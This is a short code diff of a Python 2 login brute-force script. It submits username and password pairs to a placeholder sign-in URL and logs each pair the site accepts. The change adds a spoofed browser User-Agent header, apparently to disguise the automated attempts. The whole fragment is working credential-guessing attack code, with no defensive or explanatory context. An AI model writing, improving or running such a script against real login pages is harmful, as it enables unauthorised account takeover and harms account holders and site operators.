@@ -10,12 +10,16 @@ def pull(kw):
     try:
         if len(kw) == 2:
             print u'尝试: {} , {}'.format(kw[0], kw[1])
-            url = 'http://www.xxxx.com/Account/SignIn'
+            url = 'http://www.xxx.com/Account/SignIn'
             data = urllib.urlencode({
                 'userName': kw[0],
                 'password': kw[1]
             })
-            res = urllib2.urlopen(url, data=data)
+            request = urllib2.Request(url)
+            request.add_header('User-Agent',
+                               'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) '
+                               'Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
+            res = urllib2.urlopen(request, data=data)
             content = res.read()
             if 'false' not in content:
                 logging.info('{},{}'.format(kw[0], kw[1]))
